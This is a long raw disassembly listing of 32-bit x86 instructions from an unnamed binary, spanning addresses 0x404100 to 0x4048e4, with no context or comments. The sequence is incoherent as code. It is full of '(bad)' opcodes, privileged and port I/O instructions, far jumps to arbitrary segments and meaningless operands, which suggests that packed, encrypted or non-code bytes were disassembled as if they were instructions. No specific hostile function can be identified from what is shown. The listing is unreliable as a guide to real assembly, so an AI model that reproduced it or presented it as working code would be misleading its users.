  4040fe:	jb     0x4040da
  404100:	and    eax,0x439d5757
  404105:	or     al,0x1e
  404107:	sub    dh,BYTE PTR [eax+0x2287aa83]
  40410d:	call   0x5abd14f7
  404112:	aad    0x6e
  404114:	adc    al,0xbf
  404116:	jp     0x4040ca
  404118:	iret   
  404119:	fisubr DWORD PTR [ecx+0x5b]
  40411c:	ins    BYTE PTR es:[edi],dx
  40411d:	jae    0x404124
  40411f:	inc    eax
  404120:	mov    DWORD PTR [ecx],eax
  404122:	sub    ah,BYTE PTR [ecx+0x54]
  404125:	mov    ecx,0x7e2f77b3
  40412a:	pusha  
  40412b:	xchg   ebx,eax
  40412c:	add    eax,0x574d2127
  404131:	jmp    0x7c5:0x63bceca6
  404138:	cmp    DWORD PTR [ebx+0x2b],0x49
  40413c:	pop    ss
  40413d:	mov    ecx,0xb1d00a27
  404142:	fisub  DWORD PTR [esi-0x33ed022a]
  404148:	jo     0x4040d9
  40414a:	scas   al,BYTE PTR es:[edi]
  40414b:	sub    DWORD PTR [ecx-0x4e],ebx
  40414e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40414f:	repz inc ax
  404152:	jmp    0x40418e
  404154:	addr16 pop ebp
  404156:	sub    ebp,esp
  404158:	dec    esp
  404159:	jmp    0x5c6e:0xb953986e
  404160:	(bad)  
  404161:	pop    edi
  404162:	sbb    ebp,DWORD PTR [eax+0x2c]
  404165:	imul   ecx,DWORD PTR es:[edx-0x445a7c5],0xafb57568
  404170:	out    0x96,eax
  404172:	push   ds
  404173:	cmp    edx,DWORD PTR [edi-0x48]
  404176:	fistp  WORD PTR [edx+0x14]
  404179:	pop    ebp
  40417a:	lods   eax,DWORD PTR ds:[esi]
  40417b:	sub    eax,DWORD PTR [edi+0x23]
  40417e:	rol    cl,0x72
  404181:	dec    eax
  404182:	gs jb  0x4041c9
  404185:	sbb    al,0x74
  404187:	les    ebx,FWORD PTR [eax+0x6c75613c]
  40418d:	fdiv   QWORD PTR [ebx-0x702b443c]
  404193:	mov    edx,0x52799224
  404198:	xor    dh,BYTE PTR [edx-0x22]
  40419b:	mul    DWORD PTR [ebx]
  40419d:	shr    BYTE PTR [ecx],1
  40419f:	shl    DWORD PTR [edx-0x31a9a79f],0x8b
  4041a6:	aad    0x85
  4041a8:	scas   al,BYTE PTR es:[edi]
  4041a9:	inc    DWORD PTR [edi]
  4041ab:	jno    0x4041ee
  4041ad:	repnz inc ecx
  4041af:	shl    esp,1
  4041b1:	test   eax,0x270a1718
  4041b6:	mov    ebp,0xa9690a0e
  4041bb:	xchg   esp,eax
  4041bc:	lea    ebp,[ecx+ecx*1-0x536df88e]
  4041c3:	je     0x404188
  4041c5:	pop    edi
  4041c6:	fild   QWORD PTR [ebx-0x46ec3692]
  4041cc:	mov    dl,0xa3
  4041ce:	add    DWORD PTR [ebp-0x4e],edx
  4041d1:	fimul  WORD PTR [esi-0x7a]
  4041d4:	icebp  
  4041d5:	imul   edi,DWORD PTR [ebp+0x36691eee],0x57
  4041dc:	cmp    DWORD PTR [edx-0x3d],eax
  4041df:	enter  0x48a6,0xf1
  4041e3:	xlat   BYTE PTR ds:[ebx]
  4041e4:	arpl   WORD PTR [ebx+0x6d],cx
  4041e7:	rcr    BYTE PTR [edx-0x78e7fad0],1
  4041ed:	fadd   QWORD PTR [edi+0x1035449c]
  4041f3:	fild   WORD PTR [esi-0x98a591]
  4041f9:	mov    eax,0xfe02ecad
  4041fe:	jno    0x4041a4
  404200:	imul   ebp,esi,0xffffffcf
  404203:	loope  0x404214
  404205:	retf   
  404206:	and    eax,0x6de8138c
  40420b:	aad    0x56
  40420d:	add    BYTE PTR [eax+0x5f],dl
  404210:	in     al,0xa6
  404212:	sar    BYTE PTR [ebx],cl
  404214:	cli    
  404215:	and    dh,0x1e
  404218:	adc    BYTE PTR [edi+0x3a687a0],dl
  40421e:	and    edi,eax
  404220:	pusha  
  404221:	mov    edx,0x10b461f1
  404226:	pushf  
  404227:	jl     0x404287
  404229:	call   0xbd81:0xb8f9eef7
  404230:	and    eax,0xafd7ab96
  404235:	sbb    DWORD PTR [ecx],esi
  404237:	and    eax,0xbe60cb9d
  40423c:	adc    esi,DWORD PTR [eax]
  40423e:	dec    ebx
  40423f:	mov    ebp,0x36c8713b
  404244:	xor    eax,0xda330654
  404249:	inc    esp
  40424a:	(bad)
  40424e:	or     eax,0x7270b279
  404253:	shr    BYTE PTR [ecx],0x59
  404256:	jae    0x4042b3
  404258:	sti    
  404259:	push   ds
  40425a:	xchg   eax,edi
  40425c:	jne    0x4042ca
  40425e:	clc    
  40425f:	(bad)  
  404260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404261:	call   FWORD PTR [edx+0x5a]
  404264:	fsubr  QWORD PTR [ebp+0x5a1d0aab]
  40426a:	push   es
  40426b:	jmp    0xc51a070d
  404270:	jg     0x404249
  404272:	in     eax,dx
  404273:	lods   eax,DWORD PTR ds:[esi]
  404274:	test   DWORD PTR [eax],edx
  404276:	in     al,dx
  404277:	fcomp  QWORD PTR [eax+0x4c450efa]
  40427d:	das    
  40427e:	and    edi,ebx
  404280:	lds    ecx,FWORD PTR [ecx+0x16030020]
  404286:	jno    0x404220
  404288:	cmp    al,0x2d
  40428a:	lds    eax,FWORD PTR [ecx]
  40428c:	ret    0x41d5
  40428f:	inc    eax
  404290:	gs stos DWORD PTR es:[edi],eax
  404292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404293:	sbb    ah,0x6
  404296:	xchg   ebp,eax
  404297:	mov    cl,0xd1
  404299:	mov    ah,0x96
  40429b:	mov    dh,0xa1
  40429d:	or     BYTE PTR [esi+ebp*8+0x6fd41815],bh
  4042a4:	push   edi
  4042a5:	sahf   
  4042a6:	inc    ebp
  4042a7:	or     al,0x3c
  4042a9:	jp     0x4042c4
  4042ab:	mov    ch,0x88
  4042ad:	loopne 0x4042f4
  4042af:	jle    0x40424f
  4042b1:	mov    edx,0x50216ecf
  4042b6:	popa   
  4042b7:	mov    ebp,0x173b85b5
  4042bc:	mov    al,ds:0x55945262
  4042c1:	sbb    eax,0xdb7ee0a3
  4042c6:	mov    fs,ecx
  4042c8:	push   ebp
  4042c9:	sub    DWORD PTR ds:0xf68e339a,esi
  4042cf:	or     DWORD PTR [eax+0x2e],0x2c7ea388
  4042d6:	or     DWORD PTR [edi+0x6b],0x2ba951da
  4042dd:	jmp    0x89f3ef1f
  4042e2:	scas   al,BYTE PTR es:[edi]
  4042e3:	in     eax,0x1f
  4042e5:	pop    ecx
  4042e6:	lock mov edx,edx
  4042e9:	loop   0x40432d
  4042eb:	or     BYTE PTR [ebp+esi*4+0x5d],0xa2
  4042f0:	int3   
  4042f1:	push   0xffffffb5
  4042f3:	dec    ecx
  4042f4:	inc    eax
  4042f5:	int3   
  4042f6:	add    DWORD PTR [ebp+0x3b16bab8],edx
  4042fc:	fdivr  DWORD PTR [ebp-0xc470d08]
  404302:	push   esp
  404303:	call   0x54a14bf8
  404308:	xor    BYTE PTR [edx-0x38],dl
  40430b:	xor    ah,BYTE PTR [edx+edi*4-0x59b2f407]
  404312:	jecxz  0x404326
  404314:	retf   
  404315:	xor    ah,BYTE PTR [edi+0x23]
  404318:	(bad)  
  404319:	shl    al,1
  40431b:	jnp    0x4042d5
  40431d:	mov    cl,0x85
  40431f:	je     0x404357
  404321:	fisttp DWORD PTR [edx-0x7d]
  404324:	and    dl,BYTE PTR [ecx+0x69]
  404327:	daa    
  404328:	inc    ebx
  404329:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40432b:	daa    
  40432c:	add    al,0x60
  40432e:	inc    eax
  40432f:	pop    ebp
  404330:	pop    esi
  404331:	pop    edx
  404332:	mov    edi,0xd180ca1e
  404337:	outs   dx,BYTE PTR ds:[esi]
  404338:	or     al,0x1f
  40433a:	fild   DWORD PTR [edi+0x3848109c]
  404340:	inc    esp
  404341:	inc    ecx
  404342:	pop    ebx
  404343:	js     0x40439e
  404345:	lods   eax,DWORD PTR ds:[esi]
  404346:	stos   DWORD PTR es:[edi],eax
  404347:	repnz and eax,0x8340a972
  40434d:	pop    ds
  40434e:	fild   DWORD PTR [edi-0x46]
  404351:	pop    esp
  404352:	push   eax
  404353:	jnp    0x40438a
  404355:	ret    0x4ab6
  404358:	jbe    0x4042eb
  40435a:	xor    ah,BYTE PTR [eax]
  40435c:	cdq    
  40435d:	fwait
  40435e:	xor    eax,DWORD PTR [esi+edi*2+0x4a2e5f0a]
  404365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404366:	push   0x47
  404368:	les    ebx,FWORD PTR [ecx]
  40436a:	sub    DWORD PTR fs:[eax],ebp
  40436d:	pop    edx
  40436e:	cmp    eax,0xc849aa47
  404373:	mov    ah,0xde
  404375:	jbe    0x40439c
  404377:	mov    WORD PTR [edi+esi*2-0x7d948111],?
  40437e:	into   
  40437f:	adc    DWORD PTR [edx],0xffffffe2
  404382:	dec    BYTE PTR [edx]
  404384:	loop   0x404375
  404386:	mov    edx,0x75d45c90
  40438b:	mov    dh,0xb9
  40438d:	fwait
  40438e:	xchg   DWORD PTR [esi+0x1d],ebx
  404391:	and    bl,BYTE PTR [esi-0x61fe4511]
  404397:	inc    esi
  404398:	cmp    edi,DWORD PTR [edi]
  40439a:	hlt    
  40439b:	std    
  40439c:	mov    ds:0x858dde55,eax
  4043a1:	imul   ecx,ebp,0x7a
  4043a4:	out    0x20,al
  4043a6:	mov    edx,0x404c172f
  4043ab:	inc    edi
  4043ac:	or     BYTE PTR [eax+eiz*1-0x7a],ah
  4043b0:	rcl    DWORD PTR ss:[esi-0x74],0xb
  4043b5:	or     edx,DWORD PTR [edx-0x3aa68d4a]
  4043bb:	jp     0x404386
  4043bd:	lea    edi,[ebx+0x79cb32f5]
  4043c3:	sbb    al,BYTE PTR [edx+ecx*2]
  4043c6:	adc    BYTE PTR [edi],al
  4043c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043c9:	xchg   edx,eax
  4043ca:	js     0x404428
  4043cc:	xchg   esp,eax
  4043cd:	(bad)  
  4043ce:	cmp    eax,0xc2a92b65
  4043d3:	sub    DWORD PTR [edi-0x1c],eax
  4043d6:	cdq    
  4043d7:	aam    0x27
  4043d9:	or     eax,0xeb391114
  4043de:	outs   dx,BYTE PTR ds:[esi]
  4043df:	cmp    BYTE PTR [esi-0x70],dl
  4043e2:	jo     0x404368
  4043e4:	fiadd  DWORD PTR [ebx+edi*4-0x76]
  4043e8:	push   eax
  4043e9:	and    edi,DWORD PTR [ebp+0x46]
  4043ec:	aad    0xeb
  4043ee:	(bad)  [edx+0x2b]
  4043f1:	ins    DWORD PTR es:[edi],dx
  4043f2:	add    al,0x74
  4043f4:	pop    ss
  4043f5:	xor    al,0x2
  4043f7:	xor    BYTE PTR [ecx+esi*1],ah
  4043fa:	mov    dh,0xc1
  4043fc:	jp     0x4043a8
  4043fe:	sar    DWORD PTR [esi-0x3e],1
  404401:	ins    BYTE PTR es:[edi],dx
  404402:	clc    
  404403:	pop    ds
  404404:	and    DWORD PTR [ecx-0x1],ebp
  404407:	aam    0xdf
  404409:	(bad)  
  40440a:	mov    ebx,0x84f59dac
  40440f:	mov    bh,0x36
  404411:	mov    ah,0x40
  404413:	jle    0x404464
  404415:	dec    DWORD PTR [ebp-0x2e]
  404418:	int    0xa1
  40441a:	sub    al,0xf3
  40441c:	outs   dx,BYTE PTR ds:[esi]
  40441d:	jno    0x40447d
  40441f:	xor    ch,ah
  404421:	mov    esp,0xeade53da
  404426:	pop    ss
  404427:	jl     0x4043f8
  404429:	push   eax
  40442a:	mov    ebx,0xb893d68c
  40442f:	(bad)  
  404430:	mul    BYTE PTR [edx-0x39]
  404433:	adc    al,0x71
  404435:	ror    BYTE PTR [ebp+0x4f8bc97a],0x55
  40443c:	popa   
  40443d:	xchg   ecx,eax
  40443e:	lock and DWORD PTR [ebx],esi
  404441:	pop    esp
  404442:	imul   esi,DWORD PTR [ecx-0x72],0x78
  404446:	outs   dx,BYTE PTR ds:[esi]
  404447:	enter  0x26fc,0x4d
  40444b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40444c:	adc    eax,esi
  40444e:	jb     0x404450
  404450:	mov    edi,0xdbb5288c
  404455:	mov    ?,WORD PTR [esi-0x36]
  404458:	mov    dh,0x30
  40445a:	push   es
  40445b:	push   es
  40445c:	enter  0x1fde,0xc2
  404460:	push   eax
  404461:	push   ds
  404462:	mov    WORD PTR [esi-0x7eb3a75c],?
  404468:	cmp    al,0x7a
  40446a:	mov    BYTE PTR [esi-0xff0d11d],cl
  404470:	cmp    edi,ecx
  404472:	popw   ds
  404474:	and    dh,ch
  404476:	xor    esi,DWORD PTR [edx-0x73]
  404479:	pop    esi
  40447a:	mov    esi,0x8feea5eb
  40447f:	push   esp
  404480:	aam    0x68
  404482:	mov    eax,ds:0x1bbbb00b
  404487:	cmp    al,0x17
  404489:	jne    0x404467
  40448b:	rcr    al,1
  40448d:	mov    ebx,0x8dc952d6
  404492:	xchg   esi,eax
  404493:	stc    
  404494:	icebp  
  404495:	out    dx,al
  404496:	mov    eax,0xe596d4d3
  40449b:	mov    eax,DWORD PTR [ecx-0x42]
  40449e:	scas   eax,DWORD PTR es:[edi]
  40449f:	push   0xffffff8c
  4044a1:	pop    ebp
  4044a2:	dec    edx
  4044a3:	nop
  4044a4:	and    ch,BYTE PTR ds:0x14aa116f
  4044aa:	or     al,0x17
  4044ac:	push   0xffffff99
  4044ae:	xchg   BYTE PTR [esi],cl
  4044b0:	xlat   BYTE PTR ds:[ebx]
  4044b1:	hlt    
  4044b2:	adc    al,0x8b
  4044b4:	jns    0x4044d4
  4044b6:	jb     0x4044fb
  4044b8:	lock push esp
  4044ba:	in     al,dx
  4044bb:	sbb    BYTE PTR [eax+0x23468fe3],ah
  4044c1:	ss sub ebp,eax
  4044c4:	xor    bl,BYTE PTR [ebp-0x58]
  4044c7:	jno    0x4044e1
  4044c9:	mov    ds:0xb06073ed,eax
  4044ce:	dec    edx
  4044cf:	test   DWORD PTR [ecx+0x32],edi
  4044d2:	push   esi
  4044d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044d4:	and    BYTE PTR [edx],0x62
  4044d7:	bnd jbe 0x40450d
  4044da:	push   ebp
  4044db:	xchg   BYTE PTR [esi+0x32],bh
  4044de:	dec    eax
  4044df:	xchg   esp,eax
  4044e0:	adc    ebx,esi
  4044e2:	enter  0xecc3,0x34
  4044e6:	aaa    
  4044e7:	mov    bl,0x14
  4044e9:	add    al,al
  4044eb:	cld    
  4044ec:	fwait
  4044ed:	pop    es
  4044ee:	out    0x54,eax
  4044f0:	test   al,0x9a
  4044f2:	push   edi
  4044f3:	clc    
  4044f4:	outs   dx,DWORD PTR ds:[esi]
  4044f5:	cmp    eax,0xbf54a4d5
  4044fa:	xchg   ebx,eax
  4044fb:	and    eax,0x19fc2fd8
  404500:	lahf   
  404501:	xchg   ecx,eax
  404502:	out    0xca,eax
  404504:	or     eax,0x79859b6
  404509:	daa    
  40450a:	add    BYTE PTR [edx+edx*4-0x59d89cd3],bh
  404511:	arpl   WORD PTR [edi+0x7690d6a3],sp
  404517:	mov    ds:0xb664b3e9,al
  40451c:	mov    fs,WORD PTR [esi+0x1228e5e3]
  404522:	xlat   BYTE PTR ds:[ebx]
  404523:	jmp    0x4241d228
  404528:	fwait
  404529:	retf   
  40452a:	sub    DWORD PTR [ebx],0xa1e224db
  404530:	(bad)  
  404531:	push   ecx
  404532:	jle    0x40455d
  404534:	je     0x40453b
  404536:	aas    
  404537:	dec    eax
  404538:	bound  ecx,QWORD PTR [edi-0x31]
  40453b:	(bad)  
  40453c:	(bad)  
  40453d:	xchg   edi,eax
  40453e:	mov    es,eax
  404540:	pop    ebx
  404541:	sbb    cl,BYTE PTR [eax]
  404543:	mov    ah,0x70
  404545:	jnp    0x40457f
  404547:	les    eax,FWORD PTR [eax+0x7c]
  40454a:	lods   al,BYTE PTR ds:[esi]
  40454b:	adc    ch,dl
  40454d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454e:	test   al,0xcd
  404550:	xchg   ecx,eax
  404551:	dec    esi
  404552:	(bad)  
  404553:	sti    
  404554:	push   edi
  404555:	jle    0x4044eb
  404557:	loop   0x404575
  404559:	ficomp WORD PTR [ecx+ecx*4]
  40455c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40455d:	mov    bh,0xd2
  40455f:	or     eax,0x67d89573
  404564:	mov    al,0x2e
  404566:	xor    BYTE PTR [esi],ch
  404568:	jge    0x4044f6
  40456a:	sub    DWORD PTR ds:0x9f75da55,0xffffff98
  404571:	mov    esi,0xdceb376f
  404576:	add    DWORD PTR [edi-0x4ad8eed3],edi
  40457c:	xchg   edx,eax
  40457d:	sbb    ebx,edi
  40457f:	les    edi,FWORD PTR [eax+0x3f]
  404582:	mov    ebp,0x85085d50
  404587:	or     DWORD PTR [esp+edx*1-0x629ad91c],0xffffffcd
  40458f:	jno    0x4045d8
  404591:	aad    0xee
  404593:	cmp    al,BYTE PTR [edi-0x1cf6fb79]
  404599:	pop    esi
  40459a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40459b:	(bad)  
  40459c:	and    al,0x91
  40459e:	inc    esp
  40459f:	jl     0x404595
  4045a1:	push   esi
  4045a2:	fidiv  WORD PTR [edx+0x2465d295]
  4045a8:	adc    ecx,ebp
  4045aa:	mov    esi,0x6e6d275f
  4045af:	inc    esi
  4045b0:	xor    eax,0x6d5dcc9
  4045b5:	dec    edx
  4045b6:	scas   eax,DWORD PTR es:[edi]
  4045b7:	aad    0xe7
  4045b9:	inc    ebx
  4045ba:	pop    esi
  4045bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045bc:	push   edi
  4045bd:	xor    eax,0xf95b177b
  4045c2:	sbb    eax,0x38ced884
  4045c7:	jp     0x404560
  4045c9:	dec    ebp
  4045ca:	cmc    
  4045cb:	mov    ebp,0x419b8e8c
  4045d0:	inc    edi
  4045d1:	xor    al,0xb0
  4045d3:	sbb    eax,0xbc96f62b
  4045d8:	jns    0x404575
  4045da:	jecxz  0x404627
  4045dc:	adc    al,0xb
  4045de:	shr    ebx,cl
  4045e0:	int    0x31
  4045e2:	push   edx
  4045e3:	inc    esi
  4045e4:	sub    al,0xf8
  4045e6:	sahf   
  4045e7:	inc    esp
  4045e8:	sub    bl,al
  4045ea:	jmp    0x404593
  4045ec:	or     esp,esi
  4045ee:	cmc    
  4045ef:	sbb    al,BYTE PTR [ebx]
  4045f1:	xor    eax,0x2ce13016
  4045f6:	jb     0x40464e
  4045f8:	dec    ebp
  4045f9:	add    eax,0xf083b995
  4045fe:	mov    edi,0x78eb8062
  404603:	ins    DWORD PTR es:[edi],dx
  404604:	add    BYTE PTR [ecx-0x1248142d],ch
  40460a:	fild   WORD PTR [ecx-0x17a920f4]
  404610:	test   ebp,esi
  404612:	mov    ds:0xc91e1076,al
  404617:	test   dh,0x1d
  40461a:	mov    dh,0x43
  40461c:	mov    WORD PTR [edx-0x619a6029],fs
  404622:	inc    esp
  404623:	ret    
  404624:	push   esp
  404625:	add    BYTE PTR [eax+0x5fbd069d],dh
  40462b:	(bad)  
  40462c:	jmp    0xe99419f0
  404631:	repnz cmc 
  404633:	push   ebp
  404634:	add    bl,BYTE PTR [ecx]
  404636:	push   es
  404637:	xor    al,0x8f
  404639:	adc    DWORD PTR [esi+esi*2+0x55],esp
  40463d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40463f:	fild   DWORD PTR [edx+0x62]
  404642:	mov    ch,0x23
  404644:	in     al,dx
  404645:	pop    ebp
  404646:	icebp  
  404647:	mov    edx,0x5ed02b5a
  40464c:	retf   
  40464d:	scas   al,BYTE PTR es:[edi]
  40464e:	xchg   esi,eax
  40464f:	aaa    
  404650:	xchg   edx,eax
  404651:	xor    ebp,esp
  404653:	cmc    
  404654:	lea    edi,[edx+0x64]
  404657:	cmp    DWORD PTR [edx+0x72],esp
  40465a:	leave  
  40465b:	pop    ecx
  40465c:	mov    al,ss:0xde9fdd72
  404662:	cmp    al,0xff
  404664:	dec    ebx
  404665:	sub    BYTE PTR [ebx+0x426c82bc],dl
  40466b:	mov    DWORD PTR [esi-0x4],esi
  40466e:	shl    DWORD PTR [ecx-0x75acbb6a],1
  404674:	gs aam 0xdb
  404677:	cs push cs
  404679:	adc    cl,BYTE PTR [esi+0x1a14a381]
  40467f:	cmp    eax,0x98a146da
  404684:	sub    dh,dl
  404686:	adc    eax,0xf6a1daee
  40468b:	mov    esi,0x24c9612e
  404690:	and    dh,dh
  404692:	cld    
  404693:	scas   eax,DWORD PTR es:[di]
  404695:	lds    cx,DWORD PTR [ebx]
  404698:	fstp   QWORD PTR [ecx+0x7299366c]
  40469e:	(bad)  
  40469f:	mov    ah,0x9b
  4046a1:	inc    dl
  4046a3:	jle    0x40462f
  4046a5:	js     0x404655
  4046a7:	lock mov dh,0x40
  4046aa:	add    ebp,DWORD PTR [edx-0x39]
  4046ad:	test   eax,0xbd8a73a5
  4046b2:	fmul   DWORD PTR [ebp+0x6c5071c4]
  4046b8:	(bad)  
  4046ba:	fisub  WORD PTR [esi-0x361841a8]
  4046c0:	push   ds
  4046c1:	(bad)  
  4046c2:	pusha  
  4046c3:	cmp    ebp,DWORD PTR [edi+0x21]
  4046c6:	xchg   ebx,eax
  4046c7:	hlt    
  4046c8:	in     eax,0x9c
  4046ca:	xchg   ecx,eax
  4046cb:	xor    al,0x5
  4046cd:	inc    ebx
  4046ce:	mov    esi,0xeadcf948
  4046d3:	sbb    al,0xa2
  4046d5:	stc    
  4046d6:	mov    ah,0xda
  4046d8:	push   ebx
  4046d9:	fistp  DWORD PTR [esi+0x66]
  4046dc:	adc    al,0x62
  4046de:	mov    al,0x2b
  4046e0:	mov    dl,0xb8
  4046e2:	test   al,0xf9
  4046e4:	imul   ebp,DWORD PTR [edx-0x2e],0xffffffaa
  4046e8:	ret    
  4046e9:	xchg   esp,eax
  4046ea:	jp     0x404762
  4046ec:	mov    bl,0x22
  4046ee:	push   0xffffffe6
  4046f0:	push   esi
  4046f1:	dec    edx
  4046f2:	imul   esi,DWORD PTR [esi+0x55],0x47
  4046f6:	sbb    al,0xb7
  4046f8:	xchg   edi,eax
  4046f9:	adc    DWORD PTR [esi+ecx*8+0x4f],0x7aaca55f
  404701:	jp     0x40475f
  404703:	cmp    BYTE PTR [ebp+0x11e4c778],dh
  404709:	jg     0x404760
  40470b:	pop    edx
  40470c:	stos   BYTE PTR es:[edi],al
  40470d:	in     eax,0x98
  40470f:	daa    
  404710:	cmc    
  404711:	outs   dx,BYTE PTR ds:[esi]
  404712:	adc    al,0x23
  404714:	aad    0xc4
  404716:	adc    DWORD PTR [edi-0x636787be],esp
  40471c:	and    al,0x4
  40471e:	dec    ebp
  40471f:	fiadd  WORD PTR [ebp+0x2ad95455]
  404725:	sub    BYTE PTR [ebx-0x42],bl
  404728:	mov    ds:0x833a4325,eax
  40472d:	jns    0x40477e
  40472f:	les    ebx,FWORD PTR [ecx-0xff9198a]
  404735:	stos   BYTE PTR es:[edi],al
  404736:	jmp    0xaf98:0x46068be
  40473d:	or     BYTE PTR [eax],ch
  40473f:	rcr    DWORD PTR [edi+eiz*1],0xd4
  404743:	cmp    ebx,ebp
  404745:	(bad)  
  404746:	mov    bh,0xea
  404748:	or     al,0x98
  40474a:	cmp    edi,DWORD PTR [esi+ebp*1+0xf]
  40474e:	mov    eax,0x9c1e9b8
  404753:	mov    esp,0x51fd6cdd
  404758:	mov    al,ds:0x48866d53
  40475d:	outs   dx,BYTE PTR ds:[esi]
  40475e:	add    al,0x66
  404760:	adc    BYTE PTR [edi+ebp*2+0x4511ef1b],0x6a
  404768:	mov    cs,WORD PTR [edi-0x39198320]
  40476e:	dec    ebx
  40476f:	fcom   QWORD PTR [edx+0x4da4f986]
  404775:	lock leave 
  404777:	ret    
  404778:	mov    dl,0x6c
  40477a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477b:	loop   0x4047d3
  40477d:	xchg   esp,eax
  40477e:	dec    edi
  40477f:	add    edi,DWORD PTR [edi]
  404781:	mov    edi,0x2779766f
  404786:	test   cl,0x92
  404789:	aam    0xb2
  40478b:	ficomp DWORD PTR [ebx+0x263fc104]
  404791:	cmp    dh,BYTE PTR [edx+0x153fe849]
  404797:	mov    bl,al
  404799:	in     al,0xd0
  40479b:	push   ebp
  40479c:	jnp    0x40481b
  40479e:	ds jo  0x404757
  4047a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047a2:	lds    ebp,FWORD PTR [ebx]
  4047a4:	or     al,0x89
  4047a6:	ins    DWORD PTR es:[edi],dx
  4047a7:	call   0xc002:0x2c9363b0
  4047ae:	popf   
  4047af:	(bad)  
  4047b0:	ins    BYTE PTR es:[edi],dx
  4047b1:	cwde   
  4047b2:	push   eax
  4047b3:	test   BYTE PTR [edx],bl
  4047b5:	xchg   esp,eax
  4047b6:	rcr    dl,1
  4047b8:	lsl    eax,bx
  4047bb:	fs pop es
  4047bd:	cmp    DWORD PTR [esi+0x6c5cf029],edi
  4047c3:	sar    DWORD PTR [eax+edi*4-0x30],0xd3
  4047c8:	or     dh,ch
  4047ca:	sbb    eax,0x47af4d93
  4047cf:	jb     0x404831
  4047d1:	push   cs
  4047d2:	mov    dh,bl
  4047d4:	shl    DWORD PTR [ebp+0x69],cl
  4047d7:	outs   dx,DWORD PTR ds:[esi]
  4047d8:	shr    DWORD PTR [ecx+0x793df164],0xa2
  4047df:	arpl   WORD PTR [ecx-0x1b],bp
  4047e2:	xchg   ecx,eax
  4047e3:	and    DWORD PTR [edx],esi
  4047e5:	scas   al,BYTE PTR es:[edi]
  4047e6:	fnsave [ecx-0x14]
  4047e9:	out    dx,al
  4047ea:	cld    
  4047eb:	stos   BYTE PTR es:[edi],al
  4047ec:	hlt    
  4047ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ee:	xor    DWORD PTR [ebp+0x66],edx
  4047f1:	test   DWORD PTR [esi-0x2e896919],edi
  4047f7:	adc    BYTE PTR [esi-0x47d0beb6],0x2c
  4047fe:	aaa    
  4047ff:	inc    esi
  404800:	push   ecx
  404801:	sbb    BYTE PTR [ecx+edx*4],ch
  404804:	mov    ds:0xa08c206f,al
  404809:	popa   
  40480a:	mov    al,0x2f
  40480c:	dec    edi
  40480d:	daa    
  40480e:	cmc    
  40480f:	jo     0x4047d0
  404811:	loop   0x404825
  404813:	dec    ecx
  404814:	fld    DWORD PTR [esi]
  404816:	sub    ecx,edi
  404818:	pusha  
  404819:	mov    dh,0x6a
  40481b:	(bad)  
  40481c:	push   0xffffffd7
  40481e:	mov    bh,0x99
  404820:	jp     0x404850
  404822:	test   BYTE PTR [eax-0x46],dl
  404825:	mov    WORD PTR [esi],es
  404827:	sub    al,cl
  404829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40482a:	retfw  
  40482c:	sbb    eax,0x8ae36804
  404831:	xor    esp,esi
  404833:	adc    bl,ah
  404835:	push   es
  404836:	fnstcw WORD PTR [esi+ebp*8]
  404839:	xchg   esp,esp
  40483b:	ficom  WORD PTR [ebp-0x54f40e39]
  404841:	jnp    0x404851
  404843:	pop    esp
  404844:	cs xchg edi,eax
  404846:	cmp    dh,BYTE PTR [edi]
  404848:	dec    edx
  404849:	xchg   ebp,eax
  40484a:	or     ch,ch
  40484c:	gs cmc 
  40484e:	pop    ss
  40484f:	xor    eax,0x9e5264a5
  404854:	outs   dx,DWORD PTR ds:[esi]
  404855:	sub    BYTE PTR [ebx],dh
  404857:	sbb    al,0x3c
  404859:	jecxz  0x4047e7
  40485b:	mov    DWORD PTR [eax+0x6c5148be],eax
  404861:	sbb    esi,DWORD PTR [ebx+0x2cb3312d]
  404867:	jmp    0x9bb9:0x72adb72f
  40486e:	(bad)  
  40486f:	pop    ebx
  404870:	call   0x40774701
  404875:	mov    cl,0x97
  404877:	xchg   esp,eax
  404878:	mov    ecx,0xa07815be
  40487d:	adc    eax,0xe8c73461
  404882:	out    dx,eax
  404883:	cmp    BYTE PTR [esp+edx*8+0x4e],al
  404887:	and    DWORD PTR [eax+0x2d817bc4],eax
  40488d:	jmp    0x4eda5cf4
  404892:	add    eax,0x93442023
  404897:	and    eax,0xcbcb9cf6
  40489c:	mov    al,0x9e
  40489e:	les    edi,FWORD PTR [ecx+0x119d1ded]
  4048a4:	mov    dl,BYTE PTR [ebp+0x5bc3774e]
  4048aa:	fisttp DWORD PTR es:[ebx+0x3b64ab5f]
  4048b1:	mov    bh,0x99
  4048b3:	test   DWORD PTR [ebx],esp
  4048b5:	test   BYTE PTR [edi],0x1c
  4048b8:	popf   
  4048b9:	es xchg esp,eax
  4048bb:	call   0x8f1b:0xb8c53dc4
  4048c2:	xchg   ecx,eax
  4048c3:	sti    
  4048c4:	push   edx
  4048c5:	int    0x42
  4048c7:	sbb    DWORD PTR [edi+0x1db53038],ecx
  4048cd:	loop   0x40488b
  4048cf:	lods   al,BYTE PTR ds:[esi]
  4048d0:	test   DWORD PTR [edx],esi
  4048d2:	mov    al,ds:0xcd3b58f
  4048d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048d8:	jae    0x40492c
  4048da:	xlat   BYTE PTR ds:[ebx]
  4048db:	mov    bl,0xfe
  4048de:	cmp    cl,ch
  4048e0:	ins    BYTE PTR es:[edi],dx
  4048e1:	sub    al,0xe7
  4048e3:	xchg   ecx,eax
  4048e4:	mov    dh,BYTE PTR fs:[esi]
